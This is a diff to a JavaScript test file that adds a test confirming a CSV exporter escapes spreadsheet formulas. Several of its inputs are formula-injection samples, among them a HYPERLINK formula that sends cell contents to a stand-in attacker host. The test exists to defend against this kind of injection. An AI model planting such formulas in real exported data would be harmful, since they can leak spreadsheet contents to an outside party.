@@ -19,6 +19,15 @@ describe("toCsv", () => {
     it("quotes text containing the separator, quotes or line breaks", () => {
         expect(toCsv(["name"], [['say "hi", ok']], "en")).toBe('﻿name\r\n"say ""hi"", ok"\r\n');
     });
+
+    it("keeps text that a spreadsheet would run as a formula as plain text", () => {
+        const names = ['=HYPERLINK("https://evil.example/?x="&A1,"Click")', "+SUM(1,1)", "-2+3", "@IMPORTXML(1)", "\tcmd"];
+        expect(toCsv(["name"], names.map((name) => [name]), "en")).toBe(
+            '﻿name\r\n"\'=HYPERLINK(""https://evil.example/?x=""&A1,""Click"")"\r\n"\'+SUM(1,1)"\r\n\'-2+3\r\n\'@IMPORTXML(1)\r\n\'\tcmd\r\n'
+        );
+        // Numbers are numbers, negative ones too
+        expect(toCsv(["x"], [[-2]], "nl")).toBe("﻿x\r\n-2\r\n");
+    });
 });
 
 describe("runCsv", () => {
